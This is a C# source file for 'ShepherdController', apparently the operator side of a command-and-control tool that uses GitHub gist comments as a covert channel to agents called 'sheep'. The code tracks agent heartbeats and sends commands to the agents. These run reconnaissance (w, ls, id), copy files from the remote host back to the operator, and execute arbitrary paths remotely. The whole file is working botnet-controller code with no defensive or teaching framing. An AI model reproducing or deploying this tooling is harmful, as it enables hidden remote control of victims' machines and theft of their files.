using System.Configuration;
using System.Text.RegularExpressions;
using ConsoleTables;
using Microsoft.Extensions.Configuration;
using Octokit;
using Pasture;
using Pasture.Messages;

namespace Shepherd.Core;

/// <summary>
/// Class <c>ShepherdController</c> Shepherd main controller
/// </summary>
public class ShepherdController
{
    private GitHubClient _client;
    private IDictionary<string, string?> _sheepGists;
    private IDictionary<string, bool> _sheepAlive;

    private readonly string? _hubGistId;
    private readonly string? _githubToken;
    private readonly IConfigurationRoot _config;

    public ShepherdController()
    {
        _config = new ConfigurationBuilder()
            .AddJsonFile("appsettings.json", false)
            .Build();
        
        _hubGistId = _config["HubGistId"];
        if (String.IsNullOrWhiteSpace(_hubGistId))
            throw new Exception("HubGistId configuration variable is missing!");

        _githubToken = _config["GithubToken"];
        if (String.IsNullOrWhiteSpace(_githubToken))
            throw new Exception("GithubToken configuration variable is missing!");
        

        _client = ConnectGitHubClient();
        _sheepGists = new Dictionary<string, string?>();
        _sheepAlive = new Dictionary<string, bool>();
    }


    /// <summary>
    /// Method <c>ConnectGitHubClient</c> Establish connection to Github API.
    /// </summary>
    private GitHubClient ConnectGitHubClient()
    {
        var client = new GitHubClient(new ProductHeaderValue($"shepherd"));
        var tokenAuth = new Credentials(_githubToken);
        client.Credentials = tokenAuth;

        return client;
    }

    /// <summary>
    /// Method <c>GetSheepGists</c> Return refreshed list of sheep.
    /// </summary>
    public async Task<IDictionary<string, string?>> GetSheepGists()
    {
        await RefreshAllSheep();
        return _sheepGists;
    }

    /// <summary>
    /// Method <c>GetSheepAlive</c> Return refreshed list of sheep alive status.
    /// </summary>
    public async Task<IDictionary<string, bool>> GetSheepAlive()
    {
        await RefreshAliveStatus();
        return _sheepAlive;
    }

    /// <summary>
    /// Method <c>RefreshAliveStatus</c> Refresh sheep list.
    /// </summary>
    private async Task RefreshAllSheep()
    {
        var comments =
            await _client.Gist.Comment.GetAllForGist(_hubGistId, new ApiOptions() { PageSize = 100, PageCount = 100 });

        _sheepGists.Clear();
        foreach (var comment in comments)
        {
            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage))
            {
                if (!_sheepGists.TryGetValue(assignmentMessage.SheepId, out var gist))
                {
                    _sheepGists.Add(assignmentMessage.SheepId, assignmentMessage.GistId);
                }
            }
        }
    }

    /// <summary>
    /// Method <c>RefreshAliveStatus</c> Refresh sheep alive status.
    /// </summary>
    private async Task RefreshAliveStatus()
    {
        _sheepAlive.Clear();

        foreach (var sheep in _sheepGists)
        {
            var comments =
                await _client.Gist.Comment.GetAllForGist(sheep.Value,
                    new ApiOptions() { PageSize = 100, PageCount = 100 });

            DateTimeOffset? lastTimestamp = null;
            foreach (var comment in comments)
            {
                if (HeartBeatMessage.TryParse(comment.Body, out var heartBeatMessage))
                {
                    lastTimestamp = heartBeatMessage.Timestamp;
                }
            }

            if (DateTime.UtcNow < lastTimestamp?.AddMinutes(20))
                _sheepAlive.Add(sheep.Key, true);
            else
                _sheepAlive.Add(sheep.Key, false);
        }
    }

    /// <summary>
    /// Method <c>WaitForResponse</c> Waits for request response.
    /// </summary>
    private async Task WaitForResponse(string sheepKey, int commentId, CommandMessage commandMessage)
    {
        Console.WriteLine("Waitng for response (it will take up to one minute)...");
        bool loading = true;
        while (loading)
        {
            await Task.Delay(5000);
            var comments = await _client.Gist.Comment.GetAllForGist(_sheepGists[sheepKey],
                new ApiOptions() { PageSize = 100, PageCount = 100 });

            foreach (var comment in comments)
            {
                if (ResponseMessage.TryParse(comment.Body, out var responseMessage) &&
                    responseMessage.ForCommentId == commentId)
                {
                    if (responseMessage.Type == CommandType.Cp)
                    {
                        var fileName = commandMessage.Parameters.Split('/').Last();
                        var filePath = $"{Environment.CurrentDirectory}\\{fileName}";
                        Console.WriteLine($"File received: {filePath}");

                        await File.WriteAllTextAsync(filePath, responseMessage.Response);
                    }
                    else
                    {
                        Console.WriteLine(responseMessage.Response);
                    }

                    loading = false;
                }
            }
        }
    }

    /// <summary>
    /// Method <c>CommandW</c> Sends message with linux command w.
    /// </summary>
    public async Task CommandW(string sheepKey)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.W, "");
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    /// <summary>
    /// Method <c>CommandLs</c> Sends message with linux command ls.
    /// </summary>
    public async Task CommandLs(string sheepKey, string path)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Ls, path);
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    /// <summary>
    /// Method <c>CommandId</c> Sends message with linux command id.
    /// </summary>
    public async Task CommandId(string sheepKey)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Id, "");
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    /// <summary>
    /// Method <c>CommandCopy</c> Sends message which copies remote file to local.
    /// </summary>
    public async Task CommandCopy(string sheepKey, string copyPath)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Cp, copyPath);
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }

    /// <summary>
    /// Method <c>CommandExecute</c> Sends message which performs command.
    /// </summary>
    public async Task CommandExecute(string sheepKey, string executePath)
    {
        var gistId = _sheepGists[sheepKey];
        var message = new CommandMessage(CommandType.Execute, executePath);
        var comment = await _client.Gist.Comment.Create(gistId, message.GetTransportFormat());

        await WaitForResponse(sheepKey, comment.Id, message);
    }
}